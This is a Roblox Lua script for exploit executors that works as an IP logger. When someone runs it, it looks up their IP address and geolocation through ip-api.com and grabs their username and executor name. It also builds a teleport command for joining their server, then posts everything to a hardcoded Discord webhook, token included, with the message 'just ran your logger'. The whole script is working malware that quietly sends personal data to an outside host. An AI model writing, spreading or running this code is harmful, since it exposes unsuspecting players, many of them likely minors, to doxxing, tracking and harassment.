local join_script = string.format("game:GetService('TeleportService'):TeleportToPlaceInstance(%s, '%s', game:GetService('Players').LocalPlayer)", game.PlaceId, game.JobId)
print(helo) --line above generates a script that allows u to join the logged user

--checks executor
local webhookcheck =
   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
   secure_load and "Sentinel" or
   KRNL_LOADED and "Krnl" or
   SONA_LOADED and "Sona" or
   "Kid with shit exploit"

local url =
   "https://discord.com/api/webhooks/1412473527214407783/19ll1Np_EMf6azJgUUcqDWa2jBudMg3HEiA0ldeMlX8wzIhiINjBcdmS8KTQSc5TbPAw" --pretty obvious what to do here
local data = {
            ["username"] = "BNKK-L0G", --webhook name thing idk
            ["avatar_url"] = "https://cdn.upload.systems/uploads/haO2MM1R.png", --avatar image url
    
    ["content"] = " @everyone **" ..game.Players.LocalPlayer.Name.. "** just ran your logger", --normal message
    ["embeds"] = {
       {
           ["title"] = "** " ..game.Players.LocalPlayer.Name.. " just ran your logger**",
           ["description"] = "**"..game:HttpGet("http://ip-api.com/line/?fields=61439").. "Username: "  ..game.Players.LocalPlayer.Name..", Uses: " ..webhookcheck.. "**",
           ["type"] = "rich", --line above sends all the info grabbed using the api + username and exacutor
           ["color"] = 14680319,
           ["footer"] = {
             ["text"] = "" ..join_script.. "", --sends join script
           },
       },
   }
}

local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
   ["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef) --post, idk
